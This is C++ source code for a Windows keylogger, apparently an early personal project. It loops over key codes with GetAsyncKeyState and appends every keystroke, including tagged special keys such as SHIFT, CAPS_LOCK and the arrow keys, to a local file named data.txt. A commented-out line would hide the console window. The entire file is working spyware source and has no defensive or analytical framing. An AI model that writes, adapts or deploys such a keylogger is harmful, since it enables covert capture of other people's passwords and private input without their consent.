#include <iostream>
#include <fstream>
#include <Windows.h>
using namespace std;

//functions used:
void AddKey(string input);
bool SpecialCases(int key);


int main()
{
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	//cout << "hello";
	//StartLog("hi");

	char InputChar;

	for (;;)
	{
		Sleep(10);
		for (int InputChar=8; InputChar<= 220; InputChar++)
		{
			if (GetAsyncKeyState(InputChar) == -32767) 
			{
				if (SpecialCases(InputChar) == false)
				{
					fstream DataLog;
					DataLog.open("data.txt", fstream::app);

					if (DataLog.is_open())
					{
						DataLog << char(InputChar);
						DataLog.close();
					}
				}
			}
		}
	}
}

	


//Pretty self explanatory. File is opened and the string inputted is entered.
//Since its still an initial phase it will only print "hi" into the txt accordng to main.
void AddKey(string input)
{
	fstream DataLog;
	DataLog.open("data.txt", fstream::app);

	if (DataLog.is_open())
	{
		DataLog << input;
		DataLog.close();
	}
}


bool SpecialCases(int key)
{
	switch (key) 
	{

	case VK_SPACE:
		cout << " ";
		AddKey(" ");
		return true;

	case VK_RETURN:
		cout << "\n";
		AddKey("\n");
		return true;


		//these two don't work properly
	case '¾':
		cout << ".";
		AddKey(".");
		return true;

	case '¼':
		cout << ",";
		AddKey(",");
		return true;

	case VK_SHIFT:
		cout << "#SHIFT#";
		AddKey("#SHIFT#");
		return true;

	case VK_BACK:
		cout << "\b";
		AddKey("\b");
		return true;

	case VK_RBUTTON:
		cout << "#R_CLICK#";
		AddKey("#R_CLICK#");
		return true;

	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		AddKey("#CAPS_LCOK");
		return true;

	case VK_TAB:
		cout << "#TAB";
		AddKey("#TAB");
		return true;

	case VK_UP:
		cout << "#UP";
		AddKey("#UP_ARROW_KEY");
		return true;

	case VK_DOWN:
		cout << "#DOWN";
		AddKey("#DOWN_ARROW_KEY");
		return true;

	case VK_LEFT:
		cout << "#LEFT";
		AddKey("#LEFT_ARROW_KEY");
		return true;

	case VK_RIGHT:
		cout << "#RIGHT";
		AddKey("#RIGHT_ARROW_KEY");
		return true;

	case VK_CONTROL:
		cout << "#CONTROL";
		AddKey("#CONTROL");
		return true;

	case VK_MENU:
		cout << "#ALT";
		AddKey("#ALT");
		return true;

	default: 
		return false;
	}
}